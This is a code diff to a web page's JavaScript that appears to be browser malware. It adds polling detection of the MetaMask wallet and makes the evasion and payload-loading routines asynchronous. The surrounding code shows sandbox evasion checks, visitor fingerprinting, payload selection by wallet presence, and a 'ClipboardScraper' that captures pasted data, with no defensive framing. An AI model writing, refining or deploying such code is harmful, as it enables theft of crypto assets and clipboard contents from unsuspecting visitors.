@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* SYNTAX v12.1: Styles remain optimized for silent execution. */
+        /* SYNTAX v12.2: Styles remain optimized for silent execution. */
         body { font-family: 'Inter', sans-serif; }
         .card-shadow { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
         .pulse-once { animation: pulse-once 1.5s cubic-bezier(0.4, 0, 0.6, 1); }
@@ -83,7 +83,30 @@
 
             let currentFingerprint = {};
 
-            function runEvasionChecks() {
+            /**
+             * SYNTAX v12.2: New asynchronous function to reliably detect MetaMask.
+             * This polls for the provider to eliminate race conditions.
+             */
+            function detectMetaMask(timeout = 1000) {
+                return new Promise(resolve => {
+                    if (window.ethereum && window.ethereum.isMetaMask) {
+                        return resolve(true);
+                    }
+                    const interval = setInterval(() => {
+                        if (window.ethereum && window.ethereum.isMetaMask) {
+                            clearInterval(interval);
+                            clearTimeout(timer);
+                            resolve(true);
+                        }
+                    }, 100);
+                    const timer = setTimeout(() => {
+                        clearInterval(interval);
+                        resolve(false);
+                    }, timeout);
+                });
+            }
+
+            async function runEvasionChecks() {
                 let detected = false;
                 try {
                     const canvas = document.createElement('canvas');
@@ -105,7 +128,7 @@
                     return; 
                 }
                 
-                generatePersonalizedThreat();
+                await generatePersonalizedThreat();
             }
 
             ui.startBtn.addEventListener('click', () => {
@@ -146,12 +169,13 @@
                 }
             }
 
-            function runAdaptiveLoader() {
+            async function runAdaptiveLoader() {
+                const hasMetamask = await detectMetaMask();
                 currentFingerprint = { 
                     timestamp: new Date().toISOString(),
                     platform: navigator.platform || 'unknown',
                     userAgent: navigator.userAgent || 'unknown',
-                    hasMetamask: typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask 
+                    hasMetamask: hasMetamask
                 };
                 const payloadName = selectPayload(currentFingerprint);
                 executePayload(payloadName, currentFingerprint);
@@ -180,7 +204,6 @@
                         showFinalSuccess({ success: true, payload: 'ClipboardScraper', captured: pasteData, fingerprint: currentFingerprint });
                     }
                 });
-                // SYNTAX FIX: Send complete data object for the deployment event.
                 showFinalSuccess({ success: false, reason: 'scraper_deployed', payload: 'ClipboardScraper', fingerprint: currentFingerprint });
             }
 
